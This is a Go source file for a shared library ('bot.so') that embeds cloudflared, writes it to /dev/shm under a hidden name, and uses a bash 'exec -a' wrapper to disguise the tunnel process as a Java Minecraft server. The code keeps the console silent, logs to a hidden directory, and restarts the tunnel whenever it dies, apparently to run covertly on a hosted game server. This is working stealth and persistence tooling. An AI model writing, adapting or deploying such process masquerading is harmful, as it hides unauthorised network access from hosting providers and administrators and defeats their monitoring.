/*
 * bot.go - Cloudflared 隧道 .so 封装 (进程隐藏版)
 *
 * 使用 wrapper 脚本将 cloudflared 进程重命名为 "java"
 *
 * 编译:
 * go mod init bot
 * CGO_ENABLED=1 go build -buildmode=c-shared -o bot.so bot.go
 */
package main

/*
#include <stdlib.h>
#include <string.h>
*/
import "C"

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"
	_ "embed"
)

//go:embed cloudflared
var cfBinary []byte

var (
	mu         sync.Mutex
	shouldStop bool
	cfCmd      *exec.Cmd
	logFile    *os.File
	workDir    string
)

func init() {
	// 初始化日志 - 使用 cache/.vip/.cf（PaperBootstrap 期望的位置）
	// 不输出任何信息到控制台
	logDir := "cache/.vip/.cf"
	os.MkdirAll(logDir, 0755)
	var err error
	logFile, err = os.OpenFile(logDir+"/cf.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		// 如果无法创建日志文件，静默失败（不输出到控制台）
		logFile = nil
	}

	// 获取当前工作目录
	workDir, _ = os.Getwd()
}

// logToFile 只写日志到文件，不输出到控制台
func logToFile(format string, args ...interface{}) {
	if logFile != nil {
		fmt.Fprintf(logFile, format, args...)
	}
}

// extractBinary 释放 cloudflared 到 /dev/shm
func extractBinary() (string, error) {
	binPath := filepath.Join("/dev/shm", fmt.Sprintf(".java_cache_%d", os.Getpid()))

	// 已存在且可执行，直接返回
	if fi, err := os.Stat(binPath); err == nil && fi.Size() > 1000 {
		return binPath, nil
	}

	// 释放二进制
	if err := os.WriteFile(binPath, cfBinary, 0755); err != nil {
		return "", fmt.Errorf("failed to extract binary: %v", err)
	}

	return binPath, nil
}

// createWrapperScript 创建 wrapper 脚本，用 exec -a 重命名进程
func createWrapperScript(cfBin string) (string, error) {
	wrapperPath := filepath.Join("/dev/shm", fmt.Sprintf(".java_wrapper_%d.sh", os.Getpid()))

	// 使用 bash 的 exec -a 来重命名进程为 "java"
	script := fmt.Sprintf(`#!/bin/bash
exec -a "java -Xms128M -Xmx2560M -jar server.jar" "%s" "$@"
`, cfBin)

	if err := os.WriteFile(wrapperPath, []byte(script), 0755); err != nil {
		return "", fmt.Errorf("failed to create wrapper: %v", err)
	}

	return wrapperPath, nil
}

// runCloudflared 运行 cloudflared（带进程名伪装）
func runCloudflared(targetURL string) {
	for !shouldStop {
		cfBin, err := extractBinary()
		if err != nil {
			logToFile("[bot.so] extract failed: %v\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		// 创建 wrapper 脚本
		wrapperPath, err := createWrapperScript(cfBin)
		if err != nil {
			logToFile("[bot.so] wrapper failed: %v\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		// 构建命令（通过 wrapper 运行）
		args := []string{
			"tunnel",
			"--url", targetURL,
			"--no-autoupdate",
			"--logfile", "cache/.vip/.cf/cf.log",
		}

		cmd := exec.Command(wrapperPath, args...)
		cmd.Stdout = logFile
		cmd.Stderr = logFile
		cmd.SysProcAttr = &syscall.SysProcAttr{
			Pdeathsig: syscall.SIGTERM,
		}

		// 启动进程
		if err := cmd.Start(); err != nil {
			logToFile("[bot.so] start failed: %v\n", err)
			os.Remove(wrapperPath)
			time.Sleep(5 * time.Second)
			continue
		}

		mu.Lock()
		cfCmd = cmd
		mu.Unlock()

		logToFile("[bot.so] cloudflared started (pid %d, disguised as java)\n", cmd.Process.Pid)

		// 等待进程结束
		err = cmd.Wait()

		mu.Lock()
		cfCmd = nil
		mu.Unlock()

		// 清理 wrapper 脚本
		os.Remove(wrapperPath)

		if shouldStop {
			break
		}

		if err != nil {
			logToFile("[bot.so] cloudflared exited: %v, restarting in 5s...\n", err)
		} else {
			logToFile("[bot.so] cloudflared exited normally, restarting in 5s...\n")
		}
		time.Sleep(5 * time.Second)
	}
}

// ============================================================
// 导出 C 函数
// ============================================================

//export StartCloudflared
func StartCloudflared(payload *C.char) C.int {
	goPayload := C.GoString(payload)
	if goPayload == "" {
		logToFile("[bot.so] empty payload\n")
		return -1
	}

	mu.Lock()
	if cfCmd != nil {
		mu.Unlock()
		logToFile("[bot.so] already running\n")
		return 0
	}
	shouldStop = false

	// 解析 payload，提取 URL
	var tunnelURL string
	for _, line := range strings.Split(goPayload, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "url:") {
			tunnelURL = strings.TrimSpace(strings.TrimPrefix(line, "url:"))
			break
		}
	}
	if tunnelURL == "" && strings.HasPrefix(goPayload, "url:") {
		tunnelURL = strings.TrimSpace(strings.TrimPrefix(goPayload, "url:"))
	}

	if tunnelURL == "" {
		logToFile("[bot.so] no URL found in payload\n")
		mu.Unlock()
		return -1
	}

	mu.Unlock()

	// 在 goroutine 里运行 cloudflared
	go runCloudflared(tunnelURL)

	logToFile("[bot.so] cloudflared started (disguised as java process)\n")
	return 0
}

//export StopCloudflared
func StopCloudflared(_ *C.char) C.int {
	mu.Lock()
	shouldStop = true
	if cfCmd != nil && cfCmd.Process != nil {
		cfCmd.Process.Signal(syscall.SIGTERM)
		go func() {
			time.Sleep(3 * time.Second)
			mu.Lock()
			if cfCmd != nil && cfCmd.Process != nil {
				cfCmd.Process.Kill()
			}
			mu.Unlock()
		}()
	}
	mu.Unlock()

	time.Sleep(2 * time.Second)
	return 0
}

func main() {}
